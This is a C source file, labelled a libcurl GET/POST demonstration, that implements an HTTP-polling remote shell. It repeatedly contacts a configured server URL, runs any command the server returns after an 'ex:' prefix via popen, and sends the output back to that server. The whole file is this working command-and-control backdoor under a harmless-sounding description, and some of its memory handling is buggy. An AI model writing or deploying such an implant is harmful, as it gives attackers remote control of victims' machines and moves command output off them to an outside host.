/* get and pos request demonstration with libcurl in c */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include "config.h"

#ifdef _WIN32
#include <windows.h>
#define sleep(x) Sleep(1000 * (x))
#else
#include <unistd.h>
#endif

char *getShell(char *cmd);
char *postShell(char *cmd);
char *executeCmd(char *cmd);

// Struct to hold response data
struct ResponseData {
	char *buffer;
	size_t size;
};

/* Callback function to handle the response body */
size_t write_callback(void *ptr, size_t size, size_t nmemb,
		      struct ResponseData *data)
{
	size_t total_size = size * nmemb;
	data->buffer = realloc(data->buffer, data->size + total_size + 1);
	if (data->buffer == NULL) {
		fprintf(stderr,
			"Failed to allocate memory for response buffer.\n");
		return 0;
	}
	memcpy(&(data->buffer[data->size]), ptr, total_size);
	data->size += total_size;
	data->buffer[data->size] = '\0';
	return total_size;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("Usage: %s [get|post]\n", argv[0]);
		return 1;
	}

	curl_global_init(CURL_GLOBAL_ALL);

	char *previous = NULL;
	char *output = NULL;

	switch (argv[1][0]) {
	case 'g':
	case 'p':
		while (1) {
			output = (argv[1][0] == 'g') ? getShell(previous) :
						       postShell(previous);
			if (previous != NULL) {
				free(previous);
				previous = NULL;
			}
			if (output != NULL) {
				previous = executeCmd(
					output +
					3); // pointer arithmetic go brrrr
				free(output);
			} else {
				sleep(1);
			}
		}
		break;
	case '-':
		fprintf(stderr, "No hyphen needed!\n");
		printf("Usage: %s [get|post]\n", argv[0]);
		return 1;
	default:
		printf("Usage: %s [get|post]\n", argv[0]);
		return 1;
	}
	return 0;
}
char *executeCmd(char *cmd)
{
	if (cmd == NULL) {
		return "command is null!";
	}
	FILE *fp;
	char path[1035];
	char *output = malloc(1);
	output[0] = '\0';
	fp = popen(cmd, "r");
	if (fp == NULL) {
		printf("Failed to run command\n");
		exit(1);
	}
	while (fgets(path, sizeof(path) - 1, fp) != NULL) {
		output = realloc(output, strlen(output) + strlen(path) + 1);
		strcat(output, path);
	}
	pclose(fp);
	return output;
}
char *postShell(char *cmd)
{
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char *buffer;
	if (cmd != NULL) {
		buffer = calloc(strlen(cmd) + 10, sizeof(char));
		strcpy(buffer, "output=");
		strcat(buffer, cmd);
	} else {
		buffer = calloc(20, sizeof(char));
		strcpy(buffer, "output=nuthin");
	}

	if (!curl) {
		fprintf(stderr, "curl_easy_init() failed\n");
		goto error;
	}
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	curl_easy_setopt(curl, CURLOPT_URL, URL);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);

	struct ResponseData response_data;
	response_data.buffer = NULL;
	response_data.size = 0;

	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
	res = curl_easy_perform(curl);

	if (res != CURLE_OK) {
		fprintf(stderr, "curl_easy_perform() failed: %s\n",
			curl_easy_strerror(res));
		goto error;
	}

	if (response_data.size == 0 || response_data.buffer == NULL) {
		fprintf(stderr, "No response data.\n");
		goto error;
	}

	/* if the outputs first three characters are "ex:" then we know that the server is requesting we execute a command */
	if (strncmp(response_data.buffer, "ex:", 3) == 0) {
		free(buffer);
		curl_easy_cleanup(curl);
		return response_data.buffer;
	} else {
		goto noex;
	}

error:
	fprintf(stderr, "error\n");
	free(response_data.buffer);
	free(buffer);
	curl_easy_cleanup(curl);
	return NULL;

noex:
	fprintf(stdout, "no execution\n");
	free(response_data.buffer);
	free(buffer);
	curl_easy_cleanup(curl);
	return NULL;
}

/* get request */
char *getShell(char *cmd)
{
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char *buffer;
	if (cmd != NULL) {
		char *escapedCMD = curl_easy_escape(curl, cmd, strlen(cmd));
		buffer = calloc(strlen(escapedCMD) + strlen(URL) + 10,
				sizeof(char));
		sprintf(buffer, "%s?output=%s", URL, escapedCMD);
		curl_free(escapedCMD);
	} else {
		buffer = calloc(strlen(URL) + 20, sizeof(char));
		sprintf(buffer, "%s?output=nuthin", URL);
	}

	if (!curl) {
		fprintf(stderr, "curl_easy_init() failed\n");
		goto error;
	}
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	curl_easy_setopt(curl, CURLOPT_URL, buffer);

	struct ResponseData response_data;
	response_data.buffer = NULL;
	response_data.size = 0;

	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
	res = curl_easy_perform(curl);

	if (res != CURLE_OK) {
		fprintf(stderr, "curl_easy_perform() failed: %s\n",
			curl_easy_strerror(res));
		goto error;
	}
	if (response_data.size == 0 || response_data.buffer == NULL) {
		fprintf(stderr, "No response data.\n");
		goto error;
	}

	/* if the outputs first three characters are "ex:" then we know that the server is requesting we execute a command */
	if (strncmp(response_data.buffer, "ex:", 3) == 0) {
		free(buffer);
		curl_easy_cleanup(curl);
		return response_data.buffer;
	} else {
		goto noex;
	}

error:
	fprintf(stderr, "error\n");
	free(buffer);
	curl_easy_cleanup(curl);
	return NULL;
noex:
	fprintf(stdout, "no execution\n");
	free(buffer);
	curl_easy_cleanup(curl);
	return NULL;
}
